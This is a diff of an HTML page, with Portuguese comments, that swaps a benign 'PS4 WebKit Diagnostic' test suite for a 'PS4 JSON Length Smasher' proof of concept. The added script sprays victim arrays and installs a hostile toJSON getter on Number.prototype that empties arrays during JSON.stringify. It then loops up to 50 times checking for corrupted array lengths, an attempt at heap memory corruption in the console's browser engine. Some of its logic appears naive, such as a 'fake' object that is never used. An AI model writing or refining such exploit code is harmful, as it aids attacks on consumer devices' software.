@@ -1,174 +1,108 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 WebKit Diagnostic (Safe Mode)</title>
+    <title>PS4 JSON Length Smasher (PoC)</title>
     <style>
-        body { background: #111; color: #fff; font-family: 'Courier New', monospace; padding: 20px; font-size: 18px; }
-        #console { 
-            background: #000; border: 1px solid #444; 
-            height: 80vh; overflow-y: auto; padding: 10px; 
-            white-space: pre-wrap;
-        }
-        .log { color: #aaa; margin-bottom: 4px; }
-        .info { color: #0ff; font-weight: bold; }
-        .warn { color: #ff0; font-weight: bold; }
-        .vuln { color: #f00; font-weight: bold; background: #220000; padding: 2px; }
-        .safe { color: #0f0; font-weight: bold; }
-        .title { border-bottom: 1px solid #666; margin-bottom: 10px; padding-bottom: 5px; }
+        body { background: #001; color: #0f0; font-family: monospace; padding: 20px; font-size: 20px; }
+        #log { border: 1px solid #0f0; padding: 10px; height: 80vh; overflow-y: auto; }
+        .success { color: #fff; background: #0a0; font-weight: bold; padding: 5px; }
+        .fail { color: #888; }
     </style>
 </head>
 <body>
-    <h2 class="title">DIAGNÓSTICO DE WEBKIT (FW 12.00+)</h2>
-    <div id="console">Inicializando testes...<br></div>
+    <h3>POC: JSON INTERRUPT ARRAY LENGTH</h3>
+    <div id="log">Iniciando...</div>
 
     <script>
-        const consoleDiv = document.getElementById('console');
-
-        // Função de Log Visual (Simula o DevTools)
-        function log(msg, type = 'log') {
-            const el = document.createElement('div');
-            el.className = type;
-            el.innerText = `[${type.toUpperCase()}] ${msg}`;
-            consoleDiv.appendChild(el);
-            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+        const logDiv = document.getElementById('log');
+        function log(msg, type='') {
+            logDiv.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
         }
 
-        const wait = ms => new Promise(r => setTimeout(r, ms));
+        // 1. CONFIGURAÇÃO DO HEAP
+        // Criamos arrays "vítima" que queremos corromper
+        let victims = [];
+        const TARGET_LEN = 0x10; // Tamanho original pequeno (16)
 
-        async function runSuite() {
-            await test1_PrototypePollution();
-            await wait(500);
-            await test2_JSONTrap();
-            await wait(500);
-            await test3_ArrayHoles();
-            await wait(500);
-            await test4_AdoptNodeUAF();
-            
-            log("--- DIAGNÓSTICO CONCLUÍDO ---", "info");
-        }
-
-        // ================= TESTE 1: Prototype Pollution =================
-        async function test1_PrototypePollution() {
-            log("TESTE 1: Verificando Prototype Pollution...", "info");
-            try {
-                let obj = {};
-                // Tenta poluir o protótipo base
-                Object.prototype.__ps4_test__ = "HACKED";
-                
-                if (obj.__ps4_test__ === "HACKED") {
-                    log("ALERTA: Prototype Pollution possível! (Gadgets podem ser explorados)", "vuln");
-                } else {
-                    log("Seguro: Prototype Pollution bloqueado ou mitigado.", "safe");
-                }
-                
-                // Limpeza
-                delete Object.prototype.__ps4_test__;
-            } catch(e) {
-                log("Erro no Teste 1: " + e.message, "warn");
+        function setup() {
+            victims = [];
+            for(let i=0; i<100; i++) {
+                // Array de Floats (estrutura simples na memória)
+                let a = [1.1, 2.2, 3.3, 4.4];
+                a.target = true; // Marcador
+                victims.push(a);
             }
         }
 
-        // ================= TESTE 2: JSON Confusion (Sem Crash) =================
-        async function test2_JSONTrap() {
-            log("TESTE 2: Verificando JSON Type Confusion...", "info");
-            let trapTriggered = false;
-            let strangeBehavior = false;
+        // 2. O GATILHO (JSON Trap)
+        function runAttack() {
+            let success = false;
 
-            try {
-                let victim = { a: 1 };
-                
-                // Define a armadilha, mas NÃO escreve na memória (apenas loga)
-                Object.defineProperty(Object.prototype, 'toJSON', {
-                    value: function() {
-                        trapTriggered = true;
-                        // Verifica se o 'this' se comporta de maneira estranha
-                        if (this === window || this === undefined) strangeBehavior = true;
-                        return "TRAPPED";
-                    },
-                    configurable: true
-                });
-
-                JSON.stringify(victim);
-
-                if (trapTriggered) {
-                    log("ALERTA: JSON.stringify acionou o getter poluído!", "vuln");
-                    if (strangeBehavior) {
-                        log("CRÍTICO: O contexto 'this' foi corrompido dentro do toJSON.", "vuln");
+            // Definimos o getter malicioso no protótipo
+            // O JSON.stringify vai chamar isso para cada número que tentar ler
+            Object.defineProperty(Number.prototype, "toJSON", {
+                get: function() {
+                    // AQUI É O ATAQUE:
+                    // O motor C++ está lendo o array.
+                    // Nós esvaziamos o array debaixo dos pés dele.
+                    // Se o C++ não checar de novo, ele vai escrever o resultado
+                    // fora do buffer (agora pequeno), corrompendo o vizinho.
+                    
+                    if (victims.length > 0) {
+                        // Esvazia o primeiro array vítima
+                        victims[0].length = 0; 
+                        
+                        // Tenta preencher o buraco com um objeto que tem um tamanho (length) falso
+                        // Se funcionar, o C++ escreve o 'length' falso no lugar errado
+                        let fake = { length: 0x1000 }; 
                     }
-                } else {
-                    log("Seguro: JSON.stringify ignorou a poluição.", "safe");
+                    
+                    return "hacked";
                 }
+            });
 
-                delete Object.prototype.toJSON;
-            } catch(e) {
-                log("Erro no Teste 2: " + e.message, "warn");
-            }
-        }
-
-        // ================= TESTE 3: Array Holes (Interpretador) =================
-        async function test3_ArrayHoles() {
-            log("TESTE 3: Verificando Lógica de Arrays (Interpretador)...", "info");
             try {
-                let arr = [1, 2, 3];
-                let confused = false;
-
-                // Tenta confundir o tamanho do array durante acesso
-                Object.defineProperty(arr, '1', {
-                    get: function() {
-                        arr.length = 0; // Esvazia o array no meio da leitura
-                        return 99;
-                    }
-                });
-
-                // Se o interpretador for seguro, isso deve dar undefined ou erro controlado
-                let val = arr[2]; 
+                // Cria um array isca
+                let bait = [1.1, 2.2];
                 
-                // Se o array foi esvaziado mas conseguimos ler algo depois...
-                if (val !== undefined && arr.length === 0) {
-                     log("ALERTA: Lógica de Array quebrada! Leitura após esvaziamento.", "vuln");
-                } else {
-                    log("Seguro: Array Holes tratados corretamente.", "safe");
+                // Dispara a serialização
+                // Isso vai chamar o Number.prototype.toJSON acima
+                JSON.stringify(bait);
+                
+            } catch(e) {}
+
+            // 3. VERIFICAÇÃO
+            // Checamos se algum array ficou com tamanho gigante
+            for(let i=0; i<victims.length; i++) {
+                if (victims[i].length > 4 && victims[i].length < 1000000) {
+                    log(`SUCESSO! Array[${i}] corrompido! Len: ${victims[i].length}`, "success");
+                    success = true;
+                    alert("POC SUCCESS: Array Length Corrupted!");
                 }
-            } catch(e) {
-                log("Seguro: O motor lançou erro corretamente (" + e.message + ")", "safe");
             }
+
+            // Limpeza
+            delete Number.prototype.toJSON;
+            return success;
         }
 
-        // ================= TESTE 4: AdoptNode UAF (Lógico) =================
-        async function test4_AdoptNodeUAF() {
-            log("TESTE 4: Verificando AdoptNode (UAF Lógico)...", "info");
-            try {
-                let el = document.createElement('div');
-                let frame = document.createElement('iframe');
-                document.body.appendChild(frame);
+        async function loop() {
+            let tries = 0;
+            while(tries < 50) {
+                tries++;
+                setup();
+                let result = runAttack();
                 
-                let otherDoc = frame.contentDocument;
-                let uafPotential = false;
-
-                // Observador para detectar comportamento estranho
-                let obs = new MutationObserver(() => {
-                    // Tenta acessar propriedades durante a mudança
-                    try {
-                        let _ = el.parentNode;
-                    } catch(e) { uafPotential = true; }
-                });
-                obs.observe(el, { attributes: true });
-
-                otherDoc.adoptNode(el);
+                if (result) return; // Parar se conseguir
                 
-                // Se conseguirmos acessar o elemento antigo sem erro
-                el.setAttribute('id', 'test');
+                if (tries % 10 === 0) log(`Tentativa ${tries}: Falha (seguro)`, "fail");
                 
-                log("Teste concluído sem crash. Comportamento estável.", "safe");
-                
-                frame.remove();
-            } catch(e) {
-                log("Erro no Teste 4: " + e.message, "warn");
+                await new Promise(r => setTimeout(r, 100));
             }
+            log("Teste finalizado. Nenhuma corrupção de 'length' detectada com este vetor.", "fail");
         }
 
-        // Iniciar
-        setTimeout(runSuite, 1000);
+        setTimeout(loop, 1000);
 
     </script>
 </body>
